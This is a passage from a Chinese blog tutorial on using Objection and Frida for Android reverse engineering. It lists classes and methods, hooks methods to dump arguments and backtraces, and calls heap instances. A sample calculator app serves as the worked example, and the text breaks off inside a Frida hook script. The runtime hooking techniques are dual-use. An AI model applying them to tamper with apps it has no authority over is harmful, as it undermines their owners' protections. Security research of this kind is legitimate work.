id="2、jobs命令">2、jobs命令</h4><p>作业系统很好用,用于查看和管理当前所执行  Hook的任务,建议一定要掌握,可以同时运行多项Hook作业。</p><h4 id="3、内存漫游相关指令">3、内存漫游相关指令</h4><p>Objection可以快速便捷地打印出内存中的各种类的相关信息,这对App快速定位有着无可比拟的优势,下  面介绍几个常用命令。</p><h5 id="（1）列出内存中的所有类">（1）列出内存中的所有类</h5><p>命令<code>android hooking list classes</code></p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250323173058671.png" alt="image-20250323173058671"></p><p>一共有22110个类。</p><h5 id="（2）在内存中所有已加载的类中搜索包含特定关键词的类">（2）在内存中所有已加载的类中搜索包含特定关键词的类</h5><p><code>android hooking search classes display</code></p><p>这里搜索一下包含<code>display</code>关键词的类。</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250323173440288.png" alt="image-20250323173440288"></p><h5 id="（3）从内存中搜索所有包含关键词key的方法。">（3）从内存中搜索所有包含关键词key的方法。</h5><p><code>android hooking search methods &lt;key&gt;</code></p><p>从上文中可以发现,内存中已加载的类高达22110个。它们的方法是类的个数的数倍,整个过程会相当耗时。</p><p>这里展示搜索包含display关键词的方法。</p><p><code>android hooking search methods display</code></p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250323174515328.png" alt="image-20250323174515328"></p><h5 id="（4）查看类的所有方法">（4）查看类的所有方法</h5><p><code>android hooking list class_methods &lt;className&gt;</code></p><p>随意找到一个类<code>com.android.internal.telephony.DisplayInfoControl</code>，结果如下：</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250323181548491.png" alt="image-20250323181548491"></p><h3 id="三、获取四大组件相关内容">三、获取四大组件相关内容</h3><p><code>Android</code>基础中的基础就是<code>Android</code>的四大组件，即活动 (<code>Activity</code>) 、服务(<code>Service</code>) 、广播接收器(<code>Broadcast Receiver</code>)以及内容提供者(<code>Content Provider</code>)。</p><p><code>Activity</code>可以理解为界面，一个<code>Activity</code>就是一个界面；<code>Service</code> 相当于Windows上的一个后台进程；<code>Broadcast Receiver</code>用于响应来自其他应用程序或者系统的广播消息；<code>Content Provider</code>用于进程间的交互，通常通过请求从一个应用程序向其他应用程序提供数据。</p><p>第二部分介绍都是最基础的一些<code>Java</code>类相关的内容。在<code>Android</code>中，四大组件的相关内容是非常值得关注的，<code>Objection</code>在这方面也提供了支持，下面介绍一下。</p><h4 id="1、列出进程所有的activity">1、列出进程所有的activity</h4><p><code>android hooking list activities</code></p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250323182721262.png" alt="image-20250323182721262"></p><h4 id="2、列出进程所有的service">2、列出进程所有的service</h4><p><code>android hooking list services</code></p><p>结果如下：</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250323182756596.png" alt="image-20250323182756596"></p><p>需要列出其他两个组件的信息时,只要将对应的地方更换为<code>receivers</code>和<code>providers</code>即可，这里不再演示。</p><h3 id="四、Hook相关命令">四、Hook相关命令</h3><p>作为<code>Frida</code>的核心功能，<code>Hook</code>总是不能绕过的。同样地，<code>Objection</code>作为<code>Frida</code>优秀的开发工具，<code>Hook</code>相关的  命令是一定要实现的。事实上，<code>Objection</code>在这方面的表现确实令人称赞。</p><h4 id="1、对指定的方法进行Hook">1、对指定的方法进行Hook</h4><p><code>android hooking watch class_method &lt;methodName&gt;</code></p><p>这里选择对<code>Java</code>中<code>File</code>类的构造函数进行<code>Hook</code>，结果如下：</p><p><code>android hooking watch class_method java.io.File.$init --dump-args --dump-backtrace --dump-return</code></p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250323192008745.png" alt="image-20250323192008745"></p><p>在上述命令中 , 我们加上了<code>--dump-args</code>、<code>--dumpbacktrace</code>、<code>--dump-return</code>三个参数，分别用于打印函数的参数、  调用栈以及返回值。这三个参数对逆向分析的帮助是非常大的：有些函数的明文和密文非常有可能放在参数和返回值中，而打印调用栈可以让分析者快速进行调用链的溯源。</p><p>另外需要注意的是,此时虽然只确定了<code>Hook</code>构造函数，但是默认会<code>Hook</code> 对应方法的<code>所有重载</code> 。 同时，在输出的最后一行显示<code>Registering job 561713</code>，这表示这个<code>Hook</code>被作为一个“作业”添加到<code>Objection</code>的作业系统中了，此时运行<code>job list</code>命令可以查看到这个“作业”的相关信息，如下图。可以发现这里的<code>Job  ID</code>对应的是<code>561713</code>，同时<code>Hooks</code>对应的<code>6</code>正是<code>Hook</code>的函数的数量。</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250323192539602.png" alt="image-20250323192539602"></p><p>当我在<code>com.android.phone</code>对应的&quot;电话&quot;中进行操作时，会发现<code>java.io.File.File(java.io.File, java.lang.String)</code>这一个函数被调用了。在<code>Backtrace</code>之后打印的调用栈中，可以清楚地看到这个构造函数的调用来源，如下图。</p><p>注意，调用栈的顺序是从下至上的，根据<code>Arguments</code>那一行会发现打开的文件路径是<code>/data/user_de/0/com.android.phone/files</code>，文件名为<code>persist_atoms.pb</code>。虽然<code>Return Value</code>后打印的返回值为<code>none</code>，表明这个函数没有返回值，但是也是真实地打印了返回值。当然，读者也可以<code>Hook</code>其他函数以打印返回值进行测试。</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250323193322876.png" alt="image-20250323193322876"></p><p>测试结束后，可以根据&quot;作业&quot;的<code>ID</code>来删除&quot;作业&quot;，取消对这些函数的<code>Hook</code>，最终执行结果如下：</p><p><code>jobs kill &lt;id&gt;</code></p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250323195814075.png" alt="image-20250323195814075"></p><h4 id="2、对指定类中所有函数的Hook">2、对指定类中所有函数的Hook</h4><p>除了可以直接<code>Hook</code>一个函数之外，<code>Objection</code>还可以通过执行命令实现对指定类<code>classname</code>中所有函数的Hook**(这里的所有函  数并不包括构造函数的<code>Hook</code>)**。</p><p><code>android hooking watch class &lt;classname&gt;</code></p><p>同样以<code>java.io.File</code>类为例，最终执行效果如下：</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250323201138858.png" alt="image-20250323201138858"></p><p>一共<code>Hook</code>了<code>56</code>个函数，输出结果如下：</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250323201237383.png" alt="image-20250323201237383"></p><p>最终<code>Hook</code>的效果如下。当然，这里的调用顺序（自上而下）和之前的调用栈的打印是不同的。</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250323203121588.png" alt="image-20250323203121588"></p><h3 id="五、Objection的主动调用">五、Objection的主动调用</h3><p>主动调用：<code>android heap</code>相关命令。最后介绍<code>Frida</code>的一大特色——主动调用在<code>Objection</code>中的使用。</p><h4 id="1、实例搜索-基于Java-choose实现">1、实例搜索(基于Java.choose实现)</h4><p>基于最简单的<code>Java.choose</code>的实现，在<code>Frida</code>脚本中，对实例的搜索在<code>Objection</code>中是使用以下命令实现的:</p><p><code>android heap search instances &lt;classname&gt;</code></p><p>这里仍以<code>java.io.File</code>类为例，搜索到很多<code>File</code>的实例，并且打印出对应的<code>Handle</code>和<code>toString()</code>的结果。</p><p>下图中显示的<code>Hashcode</code>十分重要，在之后的主动调用中都是以这个值作为实例的句柄来调用和执行函数。</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250323215320587.png" alt="image-20250323215320587"></p><h4 id="2、Objection中调用实例方法的两种方法">2、Objection中调用实例方法的两种方法</h4><h5 id="第一种：使用execute">第一种：使用execute</h5><p><code>android heap execute &lt;Hashcode&gt; &lt;methodname&gt;</code></p><p>这里的实例方法指的是<strong>没有参数的实例方法</strong>。下面演示一下使用<code>Hashcode</code>值为<code>31598268</code>所对应的实例来执行<code>File</code>的<code>getPath</code>方法。</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250323221934874.png" alt="image-20250323221934874"></p><p>使用<code>execute</code>执行带参函数会报错，如下图：</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250323222724278.png" alt="image-20250323222724278"></p><h5 id="第二种：使用evaluate">第二种：使用evaluate</h5><p>如果要执行带参数的函数，则需要先执行以下命令：</p><p><code>android heap evaluate &lt;Hashcode&gt;</code></p><p>在进入一个迷你编辑器环境后，输入想要执行的脚本内容,确认编辑完成，然后按Esc键退出编辑器，最后按回车键，即会开始执行这行脚本并输出结果。这里的脚本内容和在编辑器中直接编写的脚本内容是一样的（使用<code>File</code>类的<code>canWrite()</code>函数和<code>setWritable()</code>函数进  行测试）。</p><p>具体实现的代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(clazz.<span class="title function_">canWrite</span>())</span><br><span class="line">clazz.<span class="title function_">setWritable</span>(<span class="literal">false</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(clazz.<span class="title function_">canWrite</span>())</span><br></pre></td></tr></table></figure><p>在这个脚本中 , <code>Objection</code> 设定<code>clazz</code>用于代表<code>Hashcode</code>值为<code>31598268</code>所对应的实例，同时函数<code>canWrite()</code>用于返回这个实例所打  开的文件是否可写。<code>setWritable()</code>函数用于修改对应文件是否可写的属性。脚本的编辑页面和最终的执行效果如下图。其中的<code>True</code>和<code>False</code>属于输出的结果。</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250323223947608.png" alt="image-20250323223947608"></p><p><code>heap evaluate</code>既可以执行有参函数，也可以执行无参函数，这里不再演示，留待读者自行研究。</p><h3 id="六、Frida开发思想🌟">六、Frida开发思想🌟</h3><p>在介绍完<code>Frida</code>和<code>Objection</code>后，将在这一节中提出一个在逆向过程中常用的工作思路，通常将之称为“<code>Frida</code>三板斧”。</p><h4 id="1、定位：Objection辅助定位">1、定位：Objection辅助定位</h4><p>经过前面的学习，我们发现<code>Objection</code>在逆向过程中最强大的功能其实是从海量的代码中<strong>快速定位关键的程序逻辑</strong>。<code>Frida</code> 需要每次手动编写代码去<code>Hook</code>从静态分析到的函数，进而观察其参数和返回值是否与需求相符，<code>Objection</code>将常用的一些功能集成在一 起，使得逆向开发和分析人员在分析过程中不需要浪费精力在编写代码上。</p><p>下面以样例程序<code>Junior.apk</code>为例（样本来自于《 Android  Studio开发实战:从零基础到App上线(第2版)》一书中的<code>Junior</code>样例，源代码在这里<sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup>，<code>apk</code>文件在这里<sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup>。</p><p>使用<code>adb install -t junior.apk</code>命令将<code>Junior.apk</code>安装并启动后，首先使用<code>Objection</code>遍历一下<code>App</code>的所有<code>activity</code>(活动),  如下图所示。</p><p><code>android hooking list activities</code></p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250323231643853.png" alt="image-20250323231643853"></p><p>在安装和遍历<code>App</code>的所有<code>activity</code>后，我们会发现整个<code>App</code>总共有  17个<code>activity</code>，为了方便讲解，这里选择分析的目标<code>activity</code>为计算器的相关活动<code>com.example.junior.CalculatorActivity</code> ，并尝试使用如下命令去启动这个活动。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">com.example.junior <span class="title function_">on</span> <span class="params">(google: <span class="number">13</span>)</span> [usb] # android intent launch_activity com.example.junio</span><br><span class="line">r.CalculatorActivity</span><br><span class="line">(agent) Starting activity com.example.junior.CalculatorActivity...</span><br><span class="line">(agent) Activity successfully asked to start.</span><br></pre></td></tr></table></figure><p>观察手机页面，会发现<code>activity</code>被成功启动了，最终手机显示计算器的页面。</p><p>这里选取减法作为我们的分析目标,在计算器成功启动后,从源  码地址下载对应<code>android2</code>源码并直接查看这个<code>activity</code>的源码:切换  到 <code>android2</code>工程下 , 打开对应的<code>junior/src/main/java/com/example/junior/CalculatorActivity.java</code>文件，从这个文件中的<code>onCreate()</code>函数可以  看到整个活动注册了很多控件的点击事件。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// onCreate函数</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_calculator);</span><br><span class="line">        <span class="comment">// 从布局文件中获取名叫tv_result的文本视图</span></span><br><span class="line">        tv_result = findViewById(R.id.tv_result);</span><br><span class="line">        <span class="comment">// 设置tv_result内部文本的移动方式为滚动形式</span></span><br><span class="line">        tv_result.setMovementMethod(<span class="keyword">new</span> <span class="title class_">ScrollingMovementMethod</span>());</span><br><span class="line">        <span class="comment">// 下面给每个按钮控件都注册了点击监听器</span></span><br><span class="line">        findViewById(R.id.btn_cancel).setOnClickListener(<span class="built_in">this</span>); <span class="comment">// “取消”按钮</span></span><br><span class="line">        findViewById(R.id.btn_divide).setOnClickListener(<span class="built_in">this</span>); <span class="comment">// “除法”按钮</span></span><br><span class="line">        findViewById(R.id.btn_multiply).setOnClickListener(<span class="built_in">this</span>); <span class="comment">// “乘法”按钮</span></span><br><span class="line">        findViewById(R.id.btn_clear).setOnClickListener(<span class="built_in">this</span>); <span class="comment">// “清除”按钮</span></span><br><span class="line">        findViewById(R.id.btn_seven).setOnClickListener(<span class="built_in">this</span>); <span class="comment">// 数字7</span></span><br><span class="line">        findViewById(R.id.btn_eight).setOnClickListener(<span class="built_in">this</span>); <span class="comment">// 数字8</span></span><br><span class="line">        findViewById(R.id.btn_nine).setOnClickListener(<span class="built_in">this</span>); <span class="comment">// 数字9</span></span><br><span class="line">        findViewById(R.id.btn_plus).setOnClickListener(<span class="built_in">this</span>); <span class="comment">// “加法”按钮</span></span><br><span class="line">        findViewById(R.id.btn_four).setOnClickListener(<span class="built_in">this</span>); <span class="comment">// 数字4</span></span><br><span class="line">        findViewById(R.id.btn_five).setOnClickListener(<span class="built_in">this</span>); <span class="comment">// 数字5</span></span><br><span class="line">        findViewById(R.id.btn_six).setOnClickListener(<span class="built_in">this</span>); <span class="comment">// 数字6</span></span><br><span class="line">        findViewById(R.id.btn_minus).setOnClickListener(<span class="built_in">this</span>); <span class="comment">// “减法”按钮</span></span><br><span class="line">        findViewById(R.id.btn_one).setOnClickListener(<span class="built_in">this</span>); <span class="comment">// 数字1</span></span><br><span class="line">        findViewById(R.id.btn_two).setOnClickListener(<span class="built_in">this</span>); <span class="comment">// 数字2</span></span><br><span class="line">        findViewById(R.id.btn_three).setOnClickListener(<span class="built_in">this</span>); <span class="comment">// 数字3</span></span><br><span class="line">        findViewById(R.id.btn_zero).setOnClickListener(<span class="built_in">this</span>); <span class="comment">// 数字0</span></span><br><span class="line">        findViewById(R.id.btn_dot).setOnClickListener(<span class="built_in">this</span>); <span class="comment">// “小数点”按钮</span></span><br><span class="line">        findViewById(R.id.btn_equal).setOnClickListener(<span class="built_in">this</span>); <span class="comment">// “等号”按钮</span></span><br><span class="line">        findViewById(R.id.ib_sqrt).setOnClickListener(<span class="built_in">this</span>); <span class="comment">// “开平方”按钮</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>随便测试这个计算器之后会发现,每次按“等号”按钮后计算结果都会被打印出来。根据这一现象，找到对应“等号”按钮的<code>id</code>为<code>btn_equal</code>，并根据这个<code>id</code>找到对应的点击响应函数<code>onClick</code>函数中属于“等号”按钮的源码部分，最终的源码如下所示。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//onClick函数</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">resid</span> <span class="operator">=</span> v.getId(); <span class="comment">// 获得当前按钮的编号</span></span><br><span class="line">        ...</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (resid == R.id.btn_equal) &#123; <span class="comment">// 点击了等号按钮</span></span><br><span class="line">            <span class="keyword">if</span> (operator.length() == <span class="number">0</span> || operator.equals(<span class="string">&quot;＝&quot;</span>)) &#123;</span><br><span class="line">                Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;请输入运算符&quot;</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nextNum.length() &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">                Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;请输入数字&quot;</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (caculate()) &#123; <span class="comment">// 计算成功，则显示计算结果</span></span><br><span class="line">                operator = inputText;</span><br><span class="line">                showText = showText + <span class="string">&quot;=&quot;</span> + result;</span><br><span class="line">                tv_result.setText(showText);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123; <span class="comment">// 计算失败，则直接返回</span></span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>从<code>onClick</code>函数中可以发现最终真实的点击“等号”按钮后的主要代码在<code>caculate()</code>函数中。接下来就是验证我们想法的时候了：为了防止源码和真实运行代码不同，先使用以下命令验证是否存在<code>caculate()</code>函数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">com.example.junior <span class="title function_">on</span> <span class="params">(google: <span class="number">13</span>)</span> [usb] # android hooking list class_methods com.example.j</span><br><span class="line">unior.CalculatorActivity</span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> com.example.junior.CalculatorActivity.caculate()</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> com.example.junior.CalculatorActivity.clear(java.lang.String)</span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> com.example.junior.CalculatorActivity.onCreate(android.os.Bundle)</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> com.example.junior.CalculatorActivity.onClick(android.view.View)</span><br><span class="line"></span><br><span class="line">Found <span class="number">4</span> method(s)</span><br></pre></td></tr></table></figure><p>上面的执行结果说明<code>caculate()</code>函数确实是存在的。</p><p>接下来就很明显了，使用如下命令<code>Hook</code>这个函数来确认在点击  “等号”按钮后这个函数被调用了。在<code>Hook</code>上后，任意输入一个表达式并点击“等号”按钮，会发现这个函数在点击“等号”按钮后被调用，<code>Hook</code>结果如下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">com.example.junior <span class="title function_">on</span> <span class="params">(google: <span class="number">13</span>)</span> [usb] # android hooking watch class_method com.example</span><br><span class="line">.junior.CalculatorActivity.caculate --dump-args --dump-backtrace --dump-<span class="keyword">return</span></span><br><span class="line">(agent) Attempting to watch <span class="keyword">class</span> <span class="title class_">com</span>.example.junior.CalculatorActivity and method caculate.</span><br><span class="line">(agent) Hooking com.example.junior.CalculatorActivity.caculate()</span><br><span class="line">(agent) Registering job <span class="number">658110.</span> Type: watch-method <span class="keyword">for</span>: com.example.junior.CalculatorActivity.caculate</span><br></pre></td></tr></table></figure><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250324145106214.png" alt="image-20250324145106214"></p><p>查找代码，找到了其中的的<code>caculate()</code>函数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 开始加减乘除四则运算，计算成功则返回true，计算失败则返回false</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">caculate</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (operator.equals(<span class="string">&quot;＋&quot;</span>)) &#123; <span class="comment">// 当前是相加运算</span></span><br><span class="line">        result = String.valueOf(Arith.add(firstNum, nextNum));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (operator.equals(<span class="string">&quot;－&quot;</span>)) &#123; <span class="comment">// 当前是相减运算</span></span><br><span class="line">        result = String.valueOf(Arith.sub(firstNum, nextNum));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (operator.equals(<span class="string">&quot;×&quot;</span>)) &#123; <span class="comment">// 当前是相乘运算</span></span><br><span class="line">        result = String.valueOf(Arith.mul(firstNum, nextNum));</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (operator.equals(<span class="string">&quot;÷&quot;</span>)) &#123; <span class="comment">// 当前是相除运算</span></span><br><span class="line">        <span class="keyword">if</span> (Double.parseDouble(nextNum) == <span class="number">0</span>) &#123; <span class="comment">// 发现除数是0</span></span><br><span class="line">            <span class="comment">// 除数为0，要弹窗提示用户</span></span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;除数不能为零&quot;</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">            <span class="comment">// 返回false表示运算失败</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// 除数非0，则进行正常的除法运算</span></span><br><span class="line">            result = String.valueOf(Arith.div(firstNum, nextNum));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 把运算结果打印到日志中</span></span><br><span class="line">    Log.d(TAG, <span class="string">&quot;result=&quot;</span> + result);</span><br><span class="line">    firstNum = result;</span><br><span class="line">    nextNum = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="comment">// 返回true表示运算成功</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个函数中，对减法的处理是通过调用<code>Arith</code>类中的<code>sub()</code>函数来实现的。为了验证<code>Arith</code>类在内存中是真实存在的，我们通常使用以下<code>Objection</code>命令来获取一个应用在内存中的所有类。</p><p><code># android hooking list classes</code></p><p>通常，在运行这行命令后会列出很多类，甚至会超过整个<code>Terminal</code>缓存空间，这时会出现一些类被缓存冲刷掉的情况，如果只是简单地在终端窗口里查找，那么不一定能找到。其实<code>Objection</code>本身有一个<code>log</code>文件，用于记录<code>objection</code>运行时产生的所有数据。这个日志数据存放在<code>~/.objection</code>目录下的<code>objection.log</code>文件中。</p><p><strong>解决方法</strong>：在运行<code>objection</code>注入<code>App</code>之前，首先切换到<code>~/.objection</code>目录下，将之前的<code>objection.log</code>文件删除或者改名。如下所示：</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250324150259874.png" alt="image-20250324150259874"></p><p>在删除这个<code>log</code>文件后重新注入<code>App</code>，并重新遍历应用在内存中的所有类，命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">注入应用</span></span><br><span class="line">objection -g junior explore</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入到objection的命令窗口，遍历内存中的所有类</span></span><br><span class="line">android hooking list classes</span><br></pre></td></tr></table></figure><p>在遍历完成后退出<code>Objection</code>注入模式以确保<code>log</code>文件刷新成功,  并重新通过<code>cat</code>命令查看这个<code>objection.log</code>文件，由于<code>log</code>文件过大，因此还需要配合<code>grep</code>命令过滤文本，从而通过观察结果是否有输出来判定内存中是否存在目标类<code>Arith</code>，如下图所示。</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250324151645694.png" alt="image-20250324151645694"></p><p>在判定内存中确实存在<code>Arith</code>类后，我们进一步通过<code>Objection</code>命令判断<code>Arith</code>类是否存在<code>sub()</code>函数。如下图所示。</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250324152011009.png" alt="image-20250324152011009"></p><p>在内存中确定这个函数存在后，便可以使用如下命令对这个函数进行<code>Hook</code>了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking watch class_method com.example.junior.util.Arith.sub --dump-args --dump-backtrace --dump-return</span><br></pre></td></tr></table></figure><p>最终确认这个简单计算器的减法是通过<code>sub(java.lang.String,  java.lang.String)</code>实现的。</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250324233129462.png" alt="image-20250324233129462"></p><p>这里我使用了计算器的减法时，发现没能触发<code>hook</code>，这里<code>hook</code>失败了。</p><p>然后我使用同样的方法尝试了其它的<code>App</code><sup class="footnote-ref"><a href="#fn4" id="fnref4">[4]</a></sup>，成功<code>hook</code>，可能是我下载的<code>junior</code>来源有点问题。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking watch class_method com.zj.wuaipojie.Demo.a --dump-args --dump-backtrace --dump-return</span><br></pre></td></tr></table></figure><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250324234444822.png" alt="image-20250324234444822"></p><h4 id="2、利用：Frida脚本修改参数">2、利用：Frida脚本修改参数</h4><p>前面我们确认了<code>Arith</code>类的函数<code>sub(java.lang.String, java.lang.String)</code>是最终计算器减法的真实执行函数。这里尝试使用<code>frida</code>的脚本去进行<code>hook</code>这个<code>sub</code>函数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Arith</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.example.junior.util.Arith&#x27;</span>);</span><br><span class="line">        <span class="comment">// Hook Arith.sub() 方法</span></span><br><span class="line">        <span class="title class_">Arith</span>.<span class="property">sub</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">str1, str2</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">sub</span>(str1, str2);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;str1,str2,result =&gt;&#x27;</span>,str1,str2,result);</span><br><span class="line">            <span class="comment">//打印Java调用栈</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span 